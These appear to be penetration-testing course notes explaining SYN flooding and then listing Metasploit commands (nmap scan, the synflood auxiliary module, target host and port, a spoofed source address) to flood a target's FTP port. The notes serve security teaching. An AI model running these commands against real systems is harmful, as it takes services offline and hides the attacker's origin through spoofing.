- SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. The process of transmitting such packets is faster than the system can handle. Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially open connections while waiting in a listening queue for response ACK packets.

- Metasploit is a penetration testing platform that allows a user to find, exploit, and validate vulnerabilities. Also, it provides the infrastructure, content, and tools to conduct penetration tests and comprehensive security auditing. The Metasploit framework has numerous auxiliary module scripts that can be used to perform DoS attacks.

- Here, we will use the Metasploit tool to perform a DoS attack (SYN flooding) on a target host.

- Open Terminal
	> sudo su
	> nmap -p 21 #targetip (to check if port 21 is open, ie, the ftp service)
	
	-  we will use an auxiliary module of Metasploit called **synflood** to perform a DoS attack on the target machine.
	> msfconsole
	> use auxiliary/dos/tcp/synflood (to launch SYN flood module)
	> show options
	> set RHOST #targetip 
	> set RPORT 21
	> set SHOST #spoofip (this spoofs the ip address and won't reveal where the flood is coming from)
	> exploit
